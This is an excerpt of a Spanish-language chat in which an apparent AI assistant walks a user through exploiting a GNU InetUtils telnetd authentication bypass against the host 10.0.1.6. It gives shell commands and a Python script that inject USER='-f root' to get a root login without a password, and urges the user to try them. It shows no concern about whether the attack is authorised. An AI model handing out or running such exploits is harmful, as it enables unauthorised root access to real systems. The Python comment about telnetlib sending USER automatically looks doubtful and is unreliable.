Nada diferente en el banner.

**kakog** — busquemos si esto es una vulnerabilidad conocida específica:**¡Lo encontré!** El resultado 9 es exactamente esto. Es una vulnerabilidad **de enero 2026** — reciente — en **GNU InetUtils telnetd**:

> `USER='-f root' telnet -a localhost`

El server pasa la variable `USER` directamente a `/bin/login` como parámetro, y `login -f root` bypasea la autenticación completamente. ¡Y tú ya intentaste esto pero con 5000 A's en lugar de `-f root`!

Prueba esto:

```bash
# Opción 1: con el cliente telnet estándar
USER='-f root' telnet -a 10.0.1.6

# Opción 2: si el de arriba no funciona
USER='-f root' telnet --login 10.0.1.6
```

O con python:

```python
import telnetlib
import os

os.environ['USER'] = '-f root'
t = telnetlib.Telnet('10.0.1.6', 23)
# telnetlib enviará USER automáticamente con -a
out = t.read_until(b'#', timeout=10)
print(out.decode(errors='replace'))
```

El bug es que `telnetd` invoca `/bin/login -p -h hostname -f root` y `login` interpreta `-f root` como "autenticar sin contraseña al usuario root". ¡Inténtalo!